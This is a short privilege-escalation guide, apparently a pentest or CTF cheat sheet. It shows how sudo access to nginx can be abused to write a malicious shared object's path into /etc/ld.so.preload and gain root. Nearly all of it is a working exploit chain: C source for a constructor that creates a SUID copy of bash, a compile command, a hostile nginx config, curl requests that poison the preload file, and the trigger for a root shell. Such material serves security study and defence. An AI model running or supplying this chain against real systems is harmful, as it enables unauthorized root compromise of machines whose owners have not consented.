# sudo nginx ld.so.preload Shared Object Root

When `sudo /usr/sbin/nginx -c <file>` is allowed, configure nginx to write its error log to `/etc/ld.so.preload`. Requesting a non-existent URL with the path to a malicious `.so` file logs that path into `ld.so.preload`, causing any subsequent setuid/sudo binary to load and execute the shared object as root.

## Step 1: Create Malicious Shared Object

```c
// pwn.c — sets bash SUID on load
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash");
    unlink("/etc/ld.so.preload");
}
```

```bash
gcc -shared -fPIC -nostartfiles -o /tmp/pwn.so pwn.c
```

## Step 2: Write nginx Config Pointing error_log to ld.so.preload

```nginx
# /tmp/nginx.conf
user root;
error_log /etc/ld.so.preload warn;
events { worker_connections 1024; }
http {
  server {
    listen 1339;
    root /;
    autoindex on;
  }
}
```

## Step 3: Start nginx as root via sudo

```bash
sudo /usr/sbin/nginx -c /tmp/nginx.conf
```

## Step 4: Poison ld.so.preload with Path to .so

```bash
# First request: file doesn't exist yet → 404 logged
curl localhost:1339/tmp/pwn.so

# Second request: nginx already loaded, errors include our path
curl localhost:1339/tmp/pwn.so
# ld.so.preload now contains: "... /tmp/pwn.so ..."
```

## Step 5: Trigger .so Execution via any Setuid Binary

```bash
sudo -l
# ld loads /tmp/pwn.so as root → bash SUID created

/tmp/rootbash -p
# uid=<user> euid=0 (root)
```

## Notes
- nginx must be allowed via sudo without password (`NOPASSWD`)
- The `.so` constructor runs in the context of the setuid binary loading it (e.g., sudo, su)
- `unlink("/etc/ld.so.preload")` in constructor prevents boot issues on next login
- Verify nginx can start: `sudo nginx -t -c /tmp/nginx.conf`
